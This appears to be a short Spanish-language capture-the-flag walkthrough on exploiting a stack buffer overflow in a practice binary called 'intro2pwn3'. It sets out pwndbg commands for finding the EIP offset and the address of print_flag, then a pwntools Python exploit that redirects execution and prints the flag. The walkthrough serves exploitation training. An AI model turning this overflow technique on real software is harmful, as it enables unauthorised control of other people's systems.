# Overflow

## Explotar un binario por overflow


- generar un pattern y lanzarlo contra el binario a desbordar
- ver en que parte se sobrescribe EIP ('jaaa')

```
cyclic 100 > pattern
gdb ./intro2pwn3 
pwndbg> r < pattern
(EIP  0x6161616a ('jaaa'))
```

- obtenemos la direccion de la funcion a la que tenemos que saltar

```
pwndbg> print& print_flag
$1 = (<text variable, no debug info> *) 0x8048536 <print_flag>
pwndbg> 
```

- creamos un exploit

```python
from pwn import *
padding = cyclic(100)
padding = cyclic(cyclic_find('jaaa'))
eip = p32(0x8048536)
payload = padding + eip
print(payload)
```

- mandamos el payload a un archivo

```
python exp.py > attack
cat attack 
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaa6
```

- lanzar el ataque
```
./intro2pwn3 < attack 
I run as dizmas.
Who are you?: Getting Flag:
flag{13@rning_2_pwn!}
```